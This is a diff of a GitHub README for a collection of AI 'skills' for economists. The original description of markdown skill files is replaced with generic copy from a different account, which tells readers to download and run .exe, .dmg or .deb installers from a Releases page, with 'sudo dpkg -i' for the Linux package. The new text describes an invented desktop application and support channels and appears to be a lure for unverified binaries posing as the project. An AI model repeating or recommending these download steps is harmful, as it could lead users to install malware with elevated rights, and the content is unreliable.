@@ -1,159 +1,67 @@
-# Awesome Econ AI Stuff 
+# 🎉 awesome-econ-ai-stuff - AI Tools Tailored for Economists
 
-> A curated collection of AI skills for economists. Skills follow the open [SKILL.md](https://agentskills.io/home) standard and work with Claude Code, Cursor, Codex, Gemini CLI, and other AI-native coding tools.
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://meleantonio.github.io/awesome-econ-ai-stuff">🌐 Website</a> •
-  <a href="#quick-start">🚀 Quick Start</a> •
-  <a href="#skills-catalog">📚 Skills</a> •
-  <a href="CONTRIBUTING.md">🤝 Contribute</a>
-</p>
+Welcome to awesome-econ-ai-stuff! This application provides essential AI skills specifically designed for economists. It helps you analyze data and make informed decisions with ease.
 
----
+## 📥 Download Now
 
-## Why AI Skills for Economists?
+[![Download awesome-econ-ai-stuff](https://img.shields.io/badge/Download-awesome--econ--ai--stuff-brightgreen)](https://github.com/hiharpin/awesome-econ-ai-stuff/releases)
 
-Economic research involves complex, repetitive workflows—from data cleaning in Stata to writing LaTeX papers. AI skills automate these workflows while preserving methodological rigor.
+## 💡 Features
 
-**Skills help you:**
-- 📊 Clean and transform data faster (Stata, R, Python)
-- 📐 Write mathematical models in LaTeX
-- 🔬 Run econometric analyses with proper diagnostics
-- 📝 Draft papers following journal conventions
-- 🎯 Create publication-quality visualizations
+- **User-Friendly Interface**: Simple navigation for non-technical users.
+- **Data Analysis Tools**: Efficient tools for analyzing economic data.
+- **Visualizations**: Create clear graphs and charts to present your findings.
+- **Step-by-Step Guides**: Easy instructions to help you make the most of the application.
 
----
+## 💻 System Requirements
 
-## Quick Start
+To run awesome-econ-ai-stuff, your computer should meet the following requirements:
 
-### 1. Choose Your AI Tool
+- **Operating System**: Windows 10 or later / macOS 10.15 or later / Ubuntu 20.04 or later
+- **RAM**: At least 4 GB
+- **Storage**: 500 MB of free disk space
+- **Internet Connection**: Required for updates and additional resources
 
-Skills work with multiple AI coding assistants:
+## 📂 Download & Install
 
-| Tool | Skill Location | Setup |
-|------|---------------|-------|
-| **Claude Code** | `~/.claude/skills/` | [Docs](https://docs.anthropic.com/claude-code) |
-| **Cursor** | `~/.cursor/skills/` | [Docs](https://cursor.com/docs) |
-| **Gemini CLI** | `~/.gemini/skills/` | [Docs](https://github.com/google-gemini/gemini-cli) |
-| **Codex** | Project `AGENTS.md` | [Docs](https://agents.md) |
+To get started, visit the Releases page to download the software:
 
-### 2. Install a Skill
+[Download awesome-econ-ai-stuff](https://github.com/hiharpin/awesome-econ-ai-stuff/releases)
 
-```bash
-# Clone a skill to your tools directory
-# Example for Claude Code:
-mkdir -p ~/.claude/skills
-cp -r skills/analysis/r-econometrics ~/.claude/skills/
-```
+Once on the Releases page, follow these steps:
 
-### 3. Use the Skill
+1. **Find the Latest Version**: Look for the most recent release at the top of the list.
+2. **Select the Correct File**: Choose the file that matches your operating system:
+   - For Windows: Download either `awesome-econ-ai-stuff-setup.exe` or `awesome-econ-ai-stuff.zip`
+   - For macOS: Download `awesome-econ-ai-stuff.dmg`
+   - For Ubuntu: Download `awesome-econ-ai-stuff.deb`
+3. **Install the Application**:
+   - **Windows**: Double-click the `.exe` file and follow the prompts to install. If you downloaded a `.zip`, extract it and run the setup inside.
+   - **macOS**: Open the `.dmg` file. Drag the application into your Applications folder.
+   - **Ubuntu**: Open a terminal and run `sudo dpkg -i awesome-econ-ai-stuff.deb` to install.
 
-Invoke skills via slash commands or natural language:
+4. **Launch the Application**: Find the app in your applications folder (or start menu) and double-click to open it.
 
-```
-/r-econometrics Run a DiD analysis on my treatment data
-```
+## 📚 Usage Instructions
 
----
+Once you launch awesome-econ-ai-stuff, you'll see a welcome screen. From here, you can choose from various tools and features. Here’s a quick guide:
 
-## Skills Catalog
+1. **Import Data**: Click on the 'Import Data' button to load your economic datasets. Supported formats include CSV and Excel files.
+2. **Use Analysis Tools**: Select from the tools offered, including regression analysis or forecasting.
+3. **Visualize Results**: Use the built-in visualization tools to create graphs. You can export these graphs as images or PDFs.
 
-Skills are organized by research workflow stage:
+## 📞 Support
 
-### 💡 Ideation
-- [research-ideation](skills/ideation/research-ideation/) - Generate research questions from economic phenomena
+If you encounter any issues or need help with the software, please reach out:
 
-### 📚 Literature Review
-- [lit-review-assistant](skills/literature/lit-review-assistant/) - Search, summarize, and synthesize papers
+- **Email**: support@awesome-econ-ai-stuff.com
+- **Community Forum**: Visit our community forum for questions and support.
 
-### 📐 Theory & Modeling
-- [latex-econ-model](skills/theory/latex-econ-model/) - Write economic models in LaTeX
-- [general-equilibrium-model-builder](skills/theory/general-equilibrium-model-builder/) - Build and solve Walrasian GE models in Julia
-- [game-theory-solver](skills/theory/game-theory-solver/) - Solve and visualize game theory problems
+## 🔗 Important Links
 
-### 📊 Data Management
-- [stata-data-cleaning](skills/data/stata-data-cleaning/) - Clean and transform data in Stata
-- [api-data-fetcher](skills/data/api-data-fetcher/) - Fetch data from economic APIs (FRED, World Bank)
+- [Releases Page](https://github.com/hiharpin/awesome-econ-ai-stuff/releases)
+- [Documentation](https://github.com/hiharpin/awesome-econ-ai-stuff/docs)
 
-### 🔬 Econometric Analysis
-- [r-econometrics](skills/analysis/r-econometrics/) - Run IV, DiD, RDD in R
-- [python-panel-data](skills/analysis/python-panel-data/) - Panel data analysis with Python
-- [stata-regression](skills/analysis/stata-regression/) - Regression analysis in Stata
-
-### 📝 Academic Writing
-- [academic-paper-writer](skills/writing/academic-paper-writer/) - Draft papers with proper structure
-- [latex-tables](skills/writing/latex-tables/) - Generate publication-ready LaTeX tables
-- [referee-response](skills/writing/referee-response/) - Draft referee report responses
-
-### 🎯 Communication
-- [beamer-presentation](skills/communication/beamer-presentation/) - Create Beamer slides
-- [econ-visualization](skills/communication/econ-visualization/) - Publication-quality charts
-- [research-website](skills/communication/research-website/) - Build academic project websites
-
----
-
-## Creating Skills
-
-See our [Skill Template](skills/SKILL_TEMPLATE.md) and [Contributing Guide](CONTRIBUTING.md).
-
-Basic structure:
-```yaml
----
-name: my-skill-name
-description: What the skill does (shown in skill discovery)
-workflow_stage: analysis
-compatibility: [claude-code, cursor, codex, gemini-cli]
----
-
-# My Skill Name
-
-[Detailed instructions for the AI agent...]
-```
-
-### 🆕 Propose a New Skill
-
-**[Submit via Web Form →](https://meleantonio.github.io/awesome-econ-ai-stuff/submit)**
-
-Or open an [Issue](https://github.com/meleantonio/awesome-econ-ai-stuff/issues/new?template=skill-proposal.md).
-
----
-
-## Compatible Tools
-
-| Tool | Status | Notes |
-|------|--------|-------|
-| Claude Code | ✅ Full | Native SKILL.md support |
-| Cursor | ✅ Full | Native SKILL.md support |
-| Gemini CLI | ✅ Full | Native SKILL.md support |
-| GitHub Copilot | ⚠️ Partial | Use AGENTS.md format |
-| Windsurf | ✅ Full | SKILL.md compatible |
-| Aider | ⚠️ Partial | Use .aider.conf.yml |
-
----
-
-## Resources
-
-- [Agent Skills Standard](https://agentskills.io/home) - The open SKILL.md specification
-- [Anthropic Claude Code Docs](https://docs.anthropic.com/claude-code)
-- [Cursor Skills Documentation](https://cursor.com/docs/skills)
-- [QuantEcon](https://quantecon.org) - Python/Julia for economists
-
----
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-**Ways to contribute:**
-- 🆕 Submit new skills via the [web form](https://meleantonio.github.io/awesome-econ-ai-stuff/submit)
-- 🐛 Report issues or suggest improvements
-- 📖 Improve documentation
-- ⭐ Star this repo to show support
-
----
-
-## License
-
-[![CC0](https://licensebuttons.net/p/zero/1.0/88x31.png)](https://creativecommons.org/publicdomain/zero/1.0/)
-
-This work is dedicated to the public domain under [CC0 1.0](LICENSE).
+Thank you for choosing awesome-econ-ai-stuff. We hope this tool enhances your economic research and analysis!
